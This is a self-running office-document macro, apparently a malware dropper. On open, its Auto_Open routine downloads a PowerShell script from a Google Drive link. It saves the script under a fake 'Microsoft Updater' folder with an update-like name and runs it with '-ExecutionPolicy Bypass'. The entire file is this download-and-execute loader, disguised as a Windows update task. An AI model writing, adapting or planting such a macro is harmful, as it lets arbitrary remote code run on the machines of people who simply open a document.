REM  *****  BASIC  *****
Sub Auto_Open()
    Dim scriptUrl As String
    Dim savePath As String
    Dim folderPath As String
    Dim xmlHttp As Object
    Dim fso As Object
    
    ' Set the URL of your PowerAShell script
    scriptUrl = "https://drive.google.com/file/d/1iQXHNZkVtBnFUQ2HG0MQ9VqOGBNMiVYu/view?usp=sharing"
    
    ' Set the folder and file path
    folderPath = " C:\Program Files\Microsoft Updater\Update\Ver\Latest\"
    savePath = folderPath & "WinUpdateTask.ps1"
    
    On Error GoTo ErrorHandler
    
    ' Create file system object
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Create the folder structure if it doesn't exist
    If Not fso.FolderExists(folderPath) Then
        CreateFolderStructure folderPath, fso
    End If
    
    ' Create HTTP request object
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
    
    ' Download the PowerShell script
    xmlHttp.Open "GET", scriptUrl, False
    xmlHttp.Send
    
    ' Check if download was successful
    If xmlHttp.Status = 200 Then
        ' Save the script content to file
        Dim fileHandle As Integer
        fileHandle = FreeFile
        Open savePath For Binary As #fileHandle
        Put #fileHandle, , xmlHttp.ResponseBody
        Close #fileHandle
        
        ' Show success message
        MsgBox "PowerShell script downloaded successfully!" & Chr(13) & _
               "Location: " & savePath & Chr(13) & _
               "Join our security Discord: discord.gg/cybersec", 64, "Download Complete"
        
        ' Run the PowerShell script
        Shell "powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", 1
        
    Else
        MsgBox "Failed to download script. HTTP Status: " & xmlHttp.Status, 16, "Download Error"
    End If
    
    ' Clean up objects
    Set xmlHttp = Nothing
    Set fso = Nothing
    Exit Sub
    
ErrorHandler:
    MsgBox "An error occurred: " & Err.Description, 16, "Error"
    If Not xmlHttp Is Nothing Then Set xmlHttp = Nothing
    If Not fso Is Nothing Then Set fso = Nothing
End Sub

Sub CreateFolderStructure(fullPath As String, fso As Object)
    Dim pathParts As Variant
    Dim currentPath As String
    Dim i As Integer
    
    pathParts = Split(fullPath, "\")
    currentPath = pathParts(0) & "\"
    
    For i = 1 To UBound(pathParts)
        If pathParts(i) <> "" Then
            currentPath = currentPath & pathParts(i) & "\"
            If Not fso.FolderExists(currentPath) Then
                fso.CreateFolder currentPath
            End If
        End If
    Next i
End Sub
